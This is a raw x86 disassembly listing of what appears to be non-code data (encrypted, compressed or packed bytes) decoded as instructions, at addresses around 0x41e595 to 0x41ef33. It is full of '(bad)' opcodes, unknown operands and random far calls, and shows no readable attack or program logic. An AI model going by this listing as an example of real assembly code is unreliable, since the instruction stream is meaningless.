  41e595:	jp     0x41e5b9
  41e597:	jge    0x41e5bd
  41e599:	shl    BYTE PTR [edx-0x49],0x4
  41e59d:	mov    ecx,0x1b59dfda
  41e5a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5a3:	mov    bh,0xa1
  41e5a5:	jle    0x41e5fe
  41e5a7:	mov    ah,0xd4
  41e5a9:	lahf   
  41e5aa:	jp     0x41e5a2
  41e5ac:	jecxz  0x41e581
  41e5ae:	dec    edi
  41e5af:	push   ecx
  41e5b0:	dec    edi
  41e5b1:	sti    
  41e5b2:	push   edi
  41e5b3:	pop    ebp
  41e5b4:	sub    bh,dl
  41e5b6:	add    eax,0xe256fbb4
  41e5bb:	fwait
  41e5bc:	add    al,0x36
  41e5be:	cmp    BYTE PTR [ecx],dh
  41e5c0:	jl     0x41e56e
  41e5c2:	pop    ss
  41e5c3:	shl    BYTE PTR [esi-0x1fc9da83],0x78
  41e5ca:	sbb    bl,ch
  41e5cc:	pop    edx
  41e5cd:	and    al,0xe3
  41e5cf:	fs xchg ebx,eax
  41e5d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5d2:	inc    ebp
  41e5d3:	add    BYTE PTR gs:[edx-0x2b0c4c17],al
  41e5da:	fistp  WORD PTR [eax+0x39]
  41e5dd:	adc    eax,0x87f98f94
  41e5e2:	inc    ebx
  41e5e3:	in     al,dx
  41e5e4:	mov    WORD PTR [esi],?
  41e5e6:	jns    0x41e620
  41e5e8:	dec    esi
  41e5e9:	inc    esi
  41e5ea:	(bad)  
  41e5eb:	cli    
  41e5ec:	xchg   BYTE PTR [ecx],ch
  41e5ee:	jmp    0x41e60d
  41e5f0:	std    
  41e5f1:	inc    esi
  41e5f2:	jo     0x41e5da
  41e5f4:	cmp    BYTE PTR [ebx-0x26],dh
  41e5f7:	and    al,0x82
  41e5fa:	mul    DWORD PTR [ecx+0x6b]
  41e5fd:	xchg   ecx,eax
  41e5fe:	lea    edi,[bp-0x5b]
  41e602:	inc    ebp
  41e603:	inc    ebx
  41e604:	cmp    ecx,DWORD PTR [edx+0x73]
  41e607:	sbb    DWORD PTR [ebp-0x40554405],edx
  41e60d:	stos   BYTE PTR es:[edi],al
  41e60e:	lea    edi,[edi+0x4a]
  41e611:	push   ds
  41e612:	cmpps  xmm5,XMMWORD PTR [edx+0x63d1340d],0xb
  41e61a:	inc    eax
  41e61b:	add    al,0x53
  41e61d:	sub    al,0x30
  41e61f:	mov    dh,0x37
  41e621:	or     edx,ebp
  41e623:	cmp    al,0x74
  41e625:	cmc    
  41e626:	jno    0x41e681
  41e628:	add    BYTE PTR [edx],ah
  41e62a:	sbb    eax,0xe78234fe
  41e62f:	aam    0xa
  41e631:	inc    ecx
  41e632:	test   eax,0x17be6294
  41e637:	daa    
  41e638:	push   ecx
  41e639:	cli    
  41e63a:	cmp    DWORD PTR [ecx+edi*2-0x5f],0x745d8551
  41e642:	adc    eax,0x351f29cb
  41e647:	std    
  41e648:	and    BYTE PTR [ebx-0x3b],cl
  41e64b:	std    
  41e64c:	xchg   DWORD PTR [ebp+0x4b],ebp
  41e64f:	adc    eax,0x21b7fd43
  41e654:	mov    ?,WORD PTR [esi-0x5f]
  41e657:	stc    
  41e658:	inc    ecx
  41e659:	mov    ebp,0xbd2ac9be
  41e65e:	push   sp
  41e660:	out    0x28,eax
  41e662:	inc    edx
  41e663:	jno    0x41e66d
  41e665:	mov    ah,0xb9
  41e667:	push   0xffffffb3
  41e669:	and    eax,0x8ed773f2
  41e66e:	xchg   esi,eax
  41e66f:	sbb    DWORD PTR [edx-0x48065737],esi
  41e675:	push   ebx
  41e676:	stos   BYTE PTR es:[edi],al
  41e677:	daa    
  41e678:	cmp    BYTE PTR [edx-0x6a],0x39
  41e67c:	not    DWORD PTR [edi+0x67]
  41e67f:	xlat   BYTE PTR ds:[ebx]
  41e680:	mov    WORD PTR [eax-0x48],cs
  41e683:	xor    esp,DWORD PTR [esi+0x3ac7298d]
  41e689:	icebp  
  41e68a:	sub    esp,DWORD PTR [esi-0x471f02c3]
	...
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    eax,DWORD PTR [eax+ecx*1+0x439cd6f1]
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    al,0x1
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	sbb    ah,BYTE PTR [eax+0xc]
  41e70f:	std    
  41e710:	sahf   
  41e711:	and    al,0x76
  41e713:	mov    al,0x45
  41e715:	aaa    
  41e716:	retf   
  41e717:	inc    esi
  41e718:	mov    ecx,0xb14b3f5
  41e71d:	xor    eax,0x239801c4
  41e722:	dec    ecx
  41e723:	test   al,0xc5
  41e725:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e726:	mov    eax,ds:0x6398b312
  41e72b:	push   ds
  41e72c:	dec    eax
  41e72d:	ss cmp al,0xc6
  41e730:	jbe    0x41e7ab
  41e732:	mov    esp,0xdf6da3df
  41e737:	inc    esp
  41e738:	mov    esp,0x32ba2575
  41e73d:	jo     0x41e799
  41e73f:	pop    edi
  41e740:	daa    
  41e741:	shl    BYTE PTR [edx],cl
  41e743:	fs out 0x47,eax
  41e746:	mov    fs,WORD PTR [ebx]
  41e748:	push   es
  41e749:	daa    
  41e74a:	jbe    0x41e721
  41e74c:	idiv   BYTE PTR [edi+0x3b]
  41e74f:	xor    eax,0x1d33ec31
  41e754:	adc    ch,BYTE PTR [esi]
  41e756:	dec    ecx
  41e757:	jle    0x41e6f9
  41e759:	adc    esi,DWORD PTR [ecx+0x5b]
  41e75c:	ins    BYTE PTR es:[edi],dx
  41e75d:	repnz div BYTE PTR [ecx+0xf]
  41e761:	adc    DWORD PTR [ebx-0x4345efe1],edi
  41e767:	mov    cl,0x44
  41e769:	mov    ebp,0x5573095e
  41e76e:	push   cs
  41e76f:	push   ebx
  41e770:	mov    dh,0xb2
  41e772:	stos   DWORD PTR es:[edi],eax
  41e773:	push   eax
  41e774:	sahf   
  41e775:	add    BYTE PTR [ebp-0x165db05b],bh
  41e77b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e77c:	pop    esp
  41e77d:	(bad)  
  41e77e:	xchg   esi,eax
  41e77f:	xchg   esi,eax
  41e780:	(bad)  
  41e781:	pop    esp
  41e782:	fwait
  41e783:	jne    0x41e795
  41e785:	mov    ebx,0x6c59b398
  41e78a:	push   ecx
  41e78b:	cmc    
  41e78c:	xchg   ebp,eax
  41e78d:	mov    edi,0x5887e528
  41e792:	mov    esp,0xacf32be8
  41e797:	call   DWORD PTR [edx]
  41e799:	lock push cs
  41e79b:	pop    ebx
  41e79c:	pop    ss
  41e79d:	cmp    BYTE PTR [ecx-0x5488f480],dl
  41e7a3:	fs pop esi
  41e7a5:	mov    ch,0xb7
  41e7a7:	fs xchg ebx,eax
  41e7a9:	mov    WORD PTR [eax+0x1dd5a272],ss
  41e7af:	or     ah,ah
  41e7b1:	pop    esi
  41e7b2:	inc    DWORD PTR [ebx-0x1]
  41e7b5:	(bad)  
  41e7b6:	sbb    eax,0xf428466c
  41e7bb:	(bad)  
  41e7bd:	adc    DWORD PTR [esi-0x1d],edi
  41e7c0:	xor    BYTE PTR [edi],dl
  41e7c2:	retf   
  41e7c3:	nop
  41e7c4:	leave  
  41e7c5:	cmp    eax,0xe2eb620e
  41e7ca:	enter  0x1491,0x48
  41e7ce:	xchg   ebp,eax
  41e7cf:	jns    0x41e79c
  41e7d1:	(bad)  
  41e7d2:	fs jl  0x41e778
  41e7d5:	mov    ch,0x5
  41e7d7:	fcmove st,st(7)
  41e7d9:	popa   
  41e7da:	dec    edi
  41e7db:	dec    ebp
  41e7dc:	clc    
  41e7dd:	dec    edx
  41e7de:	outs   dx,BYTE PTR ds:[esi]
  41e7df:	test   eax,0x3c46b32c
  41e7e4:	mov    ebp,0xbbbde3eb
  41e7e9:	pop    edx
  41e7ea:	ins    BYTE PTR es:[edi],dx
  41e7eb:	adc    eax,0x368b037a
  41e7f0:	inc    BYTE PTR [edx-0x6]
  41e7f3:	mov    esi,0x333e705f
  41e7f8:	or     al,0xce
  41e7fa:	in     eax,dx
  41e7fb:	iret   
  41e7fc:	aam    0xce
  41e7fe:	xchg   DWORD PTR [edx-0x3a638a53],esp
  41e804:	cwde   
  41e805:	or     DWORD PTR [edi-0x21761e0e],edx
  41e80b:	in     al,dx
  41e80c:	stc    
  41e80d:	xchg   ebp,eax
  41e80e:	pop    ebp
  41e80f:	repnz add BYTE PTR [eax],al
	...
  41e872:	add    BYTE PTR [eax],al
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e823
  41e881:	xor    eax,0x44a0039b
  41e886:	add    DWORD PTR [eax],eax
  41e888:	add    al,0x1
  41e88a:	add    BYTE PTR [eax],al
  41e88c:	cld    
  41e88d:	in     al,0xdd
  41e88f:	(bad)
  41e892:	gs inc esi
  41e894:	or     ch,BYTE PTR [esi+edx*4]
  41e897:	jbe    0x41e8f4
  41e899:	xchg   dh,bh
  41e89b:	and    eax,0xde7cf3b0
  41e8a0:	mov    dh,0x84
  41e8a2:	jmp    esi
  41e8a4:	aas    
  41e8a5:	push   esp
  41e8a6:	mov    fs,edx
  41e8a8:	loopne 0x41e923
  41e8aa:	push   esp
  41e8ab:	pop    ds
  41e8ac:	shr    esi,cl
  41e8ae:	arpl   WORD PTR [ecx],bp
  41e8b0:	mov    dl,0xe7
  41e8b2:	push   ebp
  41e8b3:	xchg   ebp,eax
  41e8b4:	es ds mov dl,0x5
  41e8b8:	jns    0x41e87b
  41e8ba:	sub    al,0xcd
  41e8bc:	in     eax,0x28
  41e8be:	mov    ecx,0xe0269c02
  41e8c3:	push   ds
  41e8c4:	iret   
  41e8c5:	out    dx,al
  41e8c6:	scas   al,BYTE PTR es:[edi]
  41e8c7:	ret    
  41e8c8:	sub    al,0xf4
  41e8ca:	js     0x41e937
  41e8cc:	out    0x43,eax
  41e8ce:	push   esi
  41e8cf:	dec    esi
  41e8d0:	and    eax,0xa8d0b912
  41e8d5:	or     cl,cl
  41e8d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8d8:	leave  
  41e8d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8da:	sub    dl,BYTE PTR [bx]
  41e8dd:	into   
  41e8de:	(bad)  
  41e8df:	mov    al,ds:0x7930cbd1
  41e8e4:	add    al,0x2c
  41e8e6:	out    dx,eax
  41e8e7:	add    BYTE PTR [edi+0x1e],al
  41e8ea:	ins    DWORD PTR es:[edi],dx
  41e8eb:	and    esp,esp
  41e8ed:	ret    
  41e8ee:	jns    0x41e896
  41e8f0:	jnp    0x41e8d9
  41e8f2:	js     0x41e8f6
  41e8f4:	and    ah,cl
  41e8f6:	xchg   ebx,eax
  41e8f7:	and    DWORD PTR [edi+0x43],eax
  41e8fa:	mov    dl,0x52
  41e8fc:	das    
  41e8fd:	inc    eax
  41e8fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8ff:	xor    esi,DWORD PTR [eax+0xbce5935]
  41e905:	sbb    BYTE PTR [eax],bl
  41e907:	xor    al,0x7c
  41e909:	shl    BYTE PTR [ecx-0x32],cl
  41e90c:	rcr    DWORD PTR [ecx],cl
  41e90e:	xchg   ecx,edi
  41e910:	ret    0x9ecc
  41e913:	ror    edx,1
  41e915:	icebp  
  41e916:	lods   al,BYTE PTR ds:[esi]
  41e917:	cmp    al,0x81
  41e919:	hlt    
  41e91a:	pop    edx
  41e91b:	xchg   edx,eax
  41e91c:	dec    esi
  41e91d:	push   es
  41e91e:	xchg   esi,eax
  41e91f:	(bad)  
  41e920:	lock rcl DWORD PTR [esi-0x71058c36],1
  41e927:	js     0x41e95e
  41e929:	cmp    eax,ebp
  41e92b:	loope  0x41e916
  41e92d:	push   esp
  41e92e:	xor    DWORD PTR [edx],esp
  41e930:	in     eax,0x96
  41e932:	push   ss
  41e933:	hlt    
  41e934:	sub    al,0x8e
  41e936:	xchg   esp,eax
  41e937:	pop    ebp
  41e938:	jno    0x41e8ca
  41e93a:	shr    DWORD PTR [esi+0x6734595b],1
  41e940:	jg     0x41e8c4
  41e942:	(bad)  
  41e943:	and    DWORD PTR [ebx+0x29e73dee],esp
  41e949:	lods   eax,DWORD PTR ds:[esi]
  41e94a:	test   eax,0x89e4164e
  41e94f:	test   eax,0xf886677
  41e954:	das    
  41e955:	sub    al,0x71
  41e957:	sbb    eax,DWORD PTR [esp+0x33]
  41e95b:	retf   0x3df0
  41e95e:	sub    eax,0x21c14530
  41e963:	icebp  
  41e964:	dec    ebx
  41e965:	(bad)  
  41e966:	push   ebp
  41e967:	or     al,0x29
  41e969:	mov    bl,0x0
  41e96b:	lods   al,BYTE PTR ds:[esi]
  41e96c:	test   DWORD PTR [ecx],esi
  41e96e:	aad    0x2b
  41e970:	mov    ds:0x893cdf,al
  41e975:	pop    ds
  41e976:	push   ss
  41e977:	mov    BYTE PTR [ebx+edi*2-0x379b9151],cl
  41e97e:	(bad)  
  41e97f:	loop   0x41e902
  41e981:	push   edx
  41e982:	xchg   ebp,edx
  41e984:	cs loope 0x41e97b
  41e987:	call   0x242e:0x451a3b5a
  41e98e:	std    
  41e98f:	sldt   WORD PTR [eax]
	...
  41e9f2:	add    BYTE PTR [eax],al
  41e9f4:	js     0x41e9f3
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	inc    eax
  41ea01:	push   esp
  41ea02:	xchg   edi,eax
  41ea03:	or     esp,DWORD PTR [ebp+eax*2+0x1040001]
  41ea0a:	add    BYTE PTR [eax],al
  41ea0c:	lods   eax,DWORD PTR ds:[esi]
  41ea0d:	dec    edx
  41ea0e:	std    
  41ea0f:	fisttp QWORD PTR [esi-0x27669d7f]
  41ea15:	xor    eax,0xe0de8721
  41ea1a:	aad    0xd6
  41ea1c:	mov    al,ds:0x66ce4ada
  41ea21:	mov    al,0x17
  41ea23:	(bad)  
  41ea24:	fdivr  QWORD PTR [ebx]
  41ea26:	cmp    eax,0x1663c0fa
  41ea2b:	jg     0x41ea80
  41ea2d:	ins    DWORD PTR es:[edi],dx
  41ea2e:	icebp  
  41ea2f:	(bad)  
  41ea30:	or     ecx,eax
  41ea32:	(bad)  
  41ea33:	sbb    eax,0x11e00699
  41ea38:	adc    eax,0xf9c7aa73
  41ea3d:	jno    0x41ea16
  41ea3f:	ror    BYTE PTR [edi],0x44
  41ea42:	fisttp QWORD PTR [edi]
  41ea44:	add    DWORD PTR [eax+0x5e],eax
  41ea47:	aaa    
  41ea48:	lss    edx,FWORD PTR [edi-0x36458ebf]
  41ea4f:	call   0xb1b4:0x990dc60f
  41ea56:	sbb    esi,ecx
  41ea58:	push   ss
  41ea59:	adc    dl,BYTE PTR [edx]
  41ea5b:	jae    0x41ea07
  41ea5d:	xchg   esi,eax
  41ea5e:	aas    
  41ea5f:	aam    0x88
  41ea61:	std    
  41ea62:	pslld  mm6,QWORD PTR [ecx+ebp*1-0x210f56e8]
  41ea6a:	inc    edi
  41ea6b:	push   cs
  41ea6c:	call   0x8e5bc96c
  41ea71:	push   esi
  41ea72:	jecxz  0x41eae8
  41ea74:	push   esi
  41ea75:	push   ecx
  41ea76:	dec    ebx
  41ea77:	enter  0x6338,0x20
  41ea7b:	ds add al,0x4c
  41ea7e:	jno    0x41ea8a
  41ea80:	stos   DWORD PTR es:[edi],eax
  41ea81:	pop    ebx
  41ea82:	daa    
  41ea83:	mov    ebp,eax
  41ea85:	add    BYTE PTR [ebx+0x40],0xc2
  41ea89:	push   esi
  41ea8a:	mov    ebx,0x89d793fe
  41ea8f:	jmp    0x445f1449
  41ea94:	jecxz  0x41ea8c
  41ea96:	cmp    bh,ah
  41ea98:	out    dx,al
  41ea99:	sub    bl,BYTE PTR [eax+0x2a4ffa77]
  41ea9f:	xlat   BYTE PTR ss:[ebx]
  41eaa1:	in     al,0x1d
  41eaa3:	fst    QWORD PTR [ecx-0x1d]
  41eaa6:	ds fsin 
  41eaa9:	fadd   QWORD PTR [ebp-0x34c210ff]
  41eaaf:	mov    edx,0xb91d450e
  41eab4:	push   eax
  41eab5:	lea    ebx,[ecx-0x717545f7]
  41eabb:	xor    BYTE PTR [ecx+0x5c],dh
  41eabe:	loope  0x41ea9e
  41eac0:	pop    edx
  41eac1:	xor    eax,0xbd6a6437
  41eac6:	sub    BYTE PTR [ecx-0x37],ah
  41eac9:	lds    esp,FWORD PTR [edx]
  41eacb:	add    eax,0xdb4b8b4b
  41ead0:	psubw  mm5,QWORD PTR [esp+esi*2-0x65dd9c28]
  41ead8:	pusha  
  41ead9:	push   cs
  41eada:	sar    DWORD PTR [eax-0x14],cl
  41eadd:	inc    esi
  41eade:	and    eax,0x670f5ce0
  41eae3:	test   eax,0x9a957b95
  41eae8:	add    dl,cl
  41eaea:	push   esi
  41eaeb:	push   es
  41eaec:	mov    esp,DWORD PTR [edx+0x31]
  41eaef:	sub    BYTE PTR [eax+0x6f],dl
  41eaf2:	push   0x708e52f7
  41eaf7:	int3   
  41eaf8:	call   0xf493:0x6d6f0fdc
  41eaff:	test   eax,0xa5142aee
  41eb04:	or     dh,dl
  41eb06:	in     al,dx
  41eb07:	(bad)  
  41eb08:	mov    bl,0xc2
  41eb0a:	inc    esi
  41eb0b:	xlat   BYTE PTR ds:[ebx]
  41eb0c:	pop    ebx
  41eb0d:	sbb    DWORD PTR [edx+0x83],edx
	...
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x89
  41eb81:	and    esi,edi
  41eb83:	shr    BYTE PTR [eax+0x4000146],cl
  41eb89:	add    DWORD PTR [eax],eax
  41eb8b:	add    BYTE PTR [ecx+0x6c320f],bl
  41eb91:	fistp  QWORD PTR [ebp-0x1c0b2577]
  41eb97:	pop    es
  41eb98:	cmp    dl,ch
  41eb9a:	bnd ret 0xc463
  41eb9e:	fisubr WORD PTR [ecx-0x41]
  41eba1:	ficom  DWORD PTR [ecx+0x4f]
  41eba4:	in     eax,dx
  41eba5:	ud2    
  41eba7:	mov    eax,0x9bc0562c
  41ebac:	push   ebp
  41ebad:	inc    esp
  41ebae:	cmp    dl,cl
  41ebb0:	fcomp  QWORD PTR [esp+ecx*1+0x6be79842]
  41ebb7:	gs pop esi
  41ebb9:	adc    ebp,edi
  41ebbb:	popa   
  41ebbc:	es pop esp
  41ebbe:	adc    BYTE PTR [esi+0x51bbb4f8],0x1b
  41ebc5:	push   ebp
  41ebc6:	push   ss
  41ebc7:	call   0xa2343ff2
  41ebcc:	aaa    
  41ebcd:	loopne 0x41ec2c
  41ebcf:	stos   BYTE PTR es:[edi],al
  41ebd0:	xchg   edi,eax
  41ebd1:	aaa    
  41ebd2:	mov    esi,0xb49f4488
  41ebd7:	es xchg ebp,eax
  41ebd9:	mov    cs,esp
  41ebdb:	sbb    eax,0xe2950273
  41ebe0:	fist   DWORD PTR [eax+ebp*8]
  41ebe3:	jns    0x41ebf1
  41ebe5:	retf   
  41ebe6:	sbb    edx,ebp
  41ebe8:	ffreep st(6)
  41ebea:	mov    bl,BYTE PTR [ebp+0x13b8e56]
  41ebf0:	sub    eax,0xc178e313
  41ebf5:	inc    ebp
  41ebf6:	imul   ecx,DWORD PTR [esi+esi*1+0x1],0x20
  41ebfb:	test   BYTE PTR [esi-0x58],cl
  41ebfe:	cmp    ch,BYTE PTR [ecx+eax*4-0x4e]
  41ec02:	scas   al,BYTE PTR es:[edi]
  41ec03:	clc    
  41ec04:	sub    edx,DWORD PTR [ebx-0x7a8de3f5]
  41ec0a:	and    edi,DWORD PTR [edx]
  41ec0c:	push   esi
  41ec0d:	in     al,dx
  41ec0e:	js     0x41eb95
  41ec10:	adc    eax,ebp
  41ec12:	dec    edi
  41ec13:	add    DWORD PTR ds:0xbb2714b6,ebp
  41ec19:	daa    
  41ec1a:	mov    al,ds:0x38a1344d
  41ec1f:	sub    DWORD PTR [edx],esp
  41ec21:	mov    ah,0xb
  41ec23:	das    
  41ec24:	inc    ebp
  41ec25:	jo     0x41ec86
  41ec27:	hlt    
  41ec28:	mov    DWORD PTR [eax+0x74649d7f],edi
  41ec2e:	sbb    al,0x4d
  41ec30:	sbb    al,0x61
  41ec32:	add    DWORD PTR ds:0x7e304817,ebp
  41ec38:	cld    
  41ec39:	fdiv   DWORD PTR [esi+ecx*8+0x2544610f]
  41ec40:	jo     0x41ebfb
  41ec42:	push   ebx
  41ec43:	pop    ebp
  41ec44:	inc    ecx
  41ec45:	pop    edx
  41ec46:	mov    ds:0x429a1a9a,al
  41ec4b:	sbb    eax,0xa7469ee5
  41ec50:	sub    al,0xb9
  41ec52:	inc    ebx
  41ec53:	xchg   edi,eax
  41ec54:	or     eax,0xe167b3ee
  41ec59:	aaa    
  41ec5a:	lahf   
  41ec5b:	sar    BYTE PTR [eax+0x3f35166d],cl
  41ec61:	inc    ebx
  41ec62:	pop    esi
  41ec63:	inc    dh
  41ec65:	mov    esi,0x63fd665d
  41ec6a:	int    0xaa
  41ec6c:	mov    ecx,0x6a0bbaf3
  41ec71:	adc    DWORD PTR cs:[esi-0x338fa2a9],edx
  41ec78:	test   eax,0x6adda416
  41ec7d:	stos   BYTE PTR es:[edi],al
  41ec7e:	repz lahf 
  41ec80:	jne    0x41ec7d
  41ec82:	imul   esp,DWORD PTR [eax+ebp*4+0x41],0xed24609a
  41ec8a:	outs   dx,BYTE PTR ds:[esi]
  41ec8b:	or     BYTE PTR [ebx+0x90da13],ah
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x3d935fd0
  41ed02:	and    eax,0x147ac81
  41ed07:	add    BYTE PTR [ecx+eax*1],al
  41ed0a:	add    BYTE PTR [eax],al
  41ed0c:	sbb    al,0xc6
  41ed0e:	daa    
  41ed0f:	inc    esi
  41ed10:	js     0x41ecc7
  41ed12:	push   ds
  41ed13:	mov    dh,ch
  41ed15:	jo     0x41ed37
  41ed17:	add    cl,ah
  41ed19:	ss (bad) 
  41ed1c:	jge    0x41ecb5
  41ed1e:	out    dx,eax
  41ed1f:	cli    
  41ed20:	dec    edi
  41ed21:	mov    bl,0x37
  41ed23:	call   0xd5b49230
  41ed28:	xor    al,0x52
  41ed2a:	pop    ebp
  41ed2b:	xrelease mov DWORD PTR fs:[eax],edi
  41ed2f:	xor    al,0x51
  41ed31:	mov    cl,0xaa
  41ed33:	xor    eax,0xbc2b74a
  41ed38:	sbb    ecx,edx
  41ed3a:	jmp    0x1ab2:0x503a7bb
  41ed41:	sti    
  41ed42:	push   ecx
  41ed43:	retf   
  41ed44:	jp     0x41ed57
  41ed46:	in     eax,0xe5
  41ed48:	dec    ebp
  41ed49:	sbb    DWORD PTR [edi],eax
  41ed4b:	adc    ebp,ebp
  41ed4d:	aaa    
  41ed4e:	in     eax,0x26
  41ed50:	adc    DWORD PTR [esp+edx*1+0x69adf977],edi
  41ed57:	mov    cl,BYTE PTR [ecx+0x6a4bd19a]
  41ed5d:	push   ds
  41ed5e:	xchg   esp,eax
  41ed5f:	xchg   BYTE PTR [esi-0x14],al
  41ed62:	dec    ebp
  41ed63:	push   esi
  41ed64:	xchg   ebp,eax
  41ed65:	icebp  
  41ed66:	sbb    cl,dl
  41ed68:	add    ch,dh
  41ed6a:	add    ebp,DWORD PTR [ecx+ecx*8]
  41ed6d:	ficom  DWORD PTR [edi]
  41ed6f:	stc    
  41ed70:	aaa    
  41ed71:	push   ebx
  41ed72:	jecxz  0x41edcb
  41ed74:	ss enter 0x4eb0,0xb5
  41ed79:	test   al,0x17
  41ed7b:	mov    gs,WORD PTR [ecx]
  41ed7d:	(bad)  
  41ed7f:	add    eax,0xe2d0055c
  41ed84:	mov    ebx,0x9cbe65f4
  41ed89:	das    
  41ed8a:	inc    edx
  41ed8b:	int3   
  41ed8c:	and    dh,dh
  41ed8e:	inc    edx
  41ed8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed90:	sbb    eax,edi
  41ed92:	push   ebx
  41ed93:	(bad)  
  41ed94:	mov    ebx,0x2fec5855
  41ed99:	(bad)  
  41ed9a:	sub    eax,0xbd225c1b
  41ed9f:	and    eax,0xecb21d92
  41eda4:	jmp    0x41ee19
  41eda6:	test   BYTE PTR [ecx+0x58],0x13
  41edaa:	lahf   
  41edab:	cli    
  41edac:	xor    al,0x26
  41edae:	inc    edi
  41edaf:	mov    cl,0x7f
  41edb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edb2:	rcr    BYTE PTR [eax],1
  41edb4:	or     eax,0x986d49ab
  41edb9:	dec    esi
  41edba:	xor    eax,0x337434b5
  41edbf:	xchg   esi,eax
  41edc0:	bound  edx,QWORD PTR [ebx+0x87b366b]
  41edc6:	cmp    al,cl
  41edc8:	(bad)  
  41edca:	fsub   DWORD PTR [ebp+ecx*2-0x4d]
  41edce:	xchg   BYTE PTR [esi-0x3],ah
  41edd1:	mov    bh,0xc3
  41edd3:	div    DWORD PTR [ebp-0x2c]
  41edd6:	dec    ebx
  41edd7:	rcl    dh,cl
  41edd9:	pusha  
  41edda:	ror    BYTE PTR ds:0xaa9f8307,cl
  41ede0:	add    DWORD PTR ds:0x8f785b02,ebp
  41ede6:	out    dx,eax
  41ede7:	mov    dl,0x83
  41ede9:	lods   al,BYTE PTR ds:[esi]
  41edeb:	shl    DWORD PTR [ebx-0x7f598927],1
  41edf1:	dec    esp
  41edf2:	mov    esp,DWORD PTR [ebx+eax*4+0x7]
  41edf6:	and    ah,BYTE PTR [ebx+eax*4-0x5e]
  41edfa:	or     cl,bl
  41edfc:	mov    al,bl
  41edfe:	ror    edx,0x28
  41ee01:	xchg   edx,eax
  41ee02:	add    BYTE PTR [eax-0x2a7dd77c],bh
  41ee08:	jp     0x41ee12
  41ee0a:	mul    DWORD PTR [edi-0x35]
  41ee0d:	arpl   bx,bx
  41ee0f:	mov    al,BYTE PTR [eax]
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0xb023:0xf23c57e7
  41ee85:	dec    eax
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    al,0x1
  41ee8a:	add    BYTE PTR [eax],al
  41ee8c:	sub    DWORD PTR [ebx-0x599cf03c],ebp
  41ee92:	pop    edx
  41ee93:	push   0xf259ce38
  41ee98:	jmp    DWORD PTR [eax+0x5e]
  41ee9b:	pop    edx
  41ee9c:	mov    edx,DWORD PTR [esi+0x2fb4ede0]
  41eea2:	ret    
  41eea3:	add    BYTE PTR [edi-0x51f319b6],bl
  41eea9:	push   esp
  41eeaa:	sub    esi,ebx
  41eeac:	or     al,0x29
  41eeae:	loop   0x41ee51
  41eeb0:	dec    eax
  41eeb1:	sti    
  41eeb2:	sbb    esi,DWORD PTR [ebp+0x4b]
  41eeb5:	adc    cl,BYTE PTR [ebx+0x2b]
  41eeb8:	jmp    0xd2d:0x15214c3
  41eebf:	movd   DWORD PTR [ecx-0x53],mm4
  41eec3:	iret   
  41eec4:	jle    0x41ee55
  41eec6:	or     BYTE PTR [ebx+0x28],ah
  41eec9:	aas    
  41eeca:	ds push ss
  41eecc:	adc    eax,0x17cea224
  41eed1:	dec    ax
  41eed3:	pop    es
  41eed4:	mov    bh,0x5c
  41eed6:	mov    al,fs:0x9e9df650
  41eedc:	dec    edi
  41eedd:	inc    ebp
  41eede:	xchg   esp,eax
  41eedf:	mov    ds:0xa898a1cf,al
  41eee4:	jmp    0x475bc007
  41eee9:	push   0xfffffff4
  41eeeb:	outs   dx,DWORD PTR ds:[esi]
  41eeec:	inc    ebp
  41eeed:	push   cs
  41eeee:	pop    edi
  41eeef:	js     0x41eea5
  41eef1:	data16 mov cl,0x46
  41eef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eef5:	xchg   ebp,eax
  41eef6:	jo     0x41ef21
  41eef8:	xor    ah,BYTE PTR [edx+0x40ed4546]
  41eefe:	pop    eax
  41eeff:	div    BYTE PTR [ebp+0x32]
  41ef02:	mov    bl,0x29
  41ef04:	jns    0x41eece
  41ef06:	push   es
  41ef07:	jge    0x41ef7f
  41ef09:	sti    
  41ef0a:	mov    esi,0x53edf139
  41ef0f:	or     DWORD PTR [edx+ebp*8],ecx
  41ef12:	sbb    bl,BYTE PTR [eax+0x6b]
  41ef15:	adc    eax,0xf5fa62da
  41ef1a:	adc    BYTE PTR [esp+ebp*1],ah
  41ef1d:	push   0xffffff82
  41ef1f:	mov    ah,0xb5
  41ef21:	inc    ecx
  41ef22:	or     BYTE PTR [edx+0x32efb2f3],cl
  41ef28:	pop    eax
  41ef29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef2a:	jl     0x41ef9a
  41ef2c:	mul    dl
  41ef2e:	ins    DWORD PTR es:[edi],dx
  41ef2f:	mov    DWORD PTR [esi],ecx
  41ef31:	aad    0xb6
  41ef33:	sub    BYTE PTR [ebx-0x22],cl
